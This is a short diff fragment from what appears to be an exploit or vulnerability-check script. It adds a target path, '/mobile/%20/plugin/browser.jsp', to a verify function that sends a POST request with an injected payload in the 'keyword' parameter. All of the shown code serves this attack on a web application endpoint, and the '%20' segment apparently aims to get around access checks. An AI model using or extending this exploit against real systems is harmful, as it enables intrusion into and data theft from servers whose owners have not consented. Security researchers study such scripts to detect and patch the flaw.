@@ -23,6 +23,7 @@ def get_payload(payload):
     return  string
     
 def verify(url, paylaod):
+    url = url + "/mobile/%20/plugin/browser.jsp"
     paylaod_string =  get_payload(paylaod)
     data = "isDis=1&browserTypeId=269&keyword=" + paylaod_string
     headers = {
